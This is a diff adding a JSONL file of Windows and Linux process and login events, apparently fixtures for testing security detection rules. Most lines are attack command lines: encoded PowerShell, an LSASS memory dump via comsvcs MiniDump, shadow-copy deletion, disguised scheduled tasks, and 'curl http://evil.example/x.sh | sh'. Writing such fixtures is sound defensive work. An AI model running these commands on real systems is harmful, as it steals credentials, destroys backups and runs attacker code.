@@ -1,0 +1,10 @@
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -enc SQBFAFgA", "ParentImage": "C:\\Windows\\explorer.exe"}
+{"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"}
+{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full", "ParentImage": "C:\\Windows\\cmd.exe"}
+{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet"}
+{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn Updater /tr C:\\temp\\a.exe /sc daily"}
+{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn GoogleUpdateTaskMachine /tr x"}
+{"event": {"outcome": "success"}, "user": {"name": "Administrator"}, "source": {"ip": "203.0.113.50"}}
+{"event": {"outcome": "success"}, "user": {"name": "Administrator"}, "source": {"ip": "10.1.2.3"}}
+{"CommandLine": "bash -c 'curl http://evil.example/x.sh | sh'"}
+{"Image": "C:\\Windows\\notepad.exe", "CommandLine": "notepad.exe a.txt"}
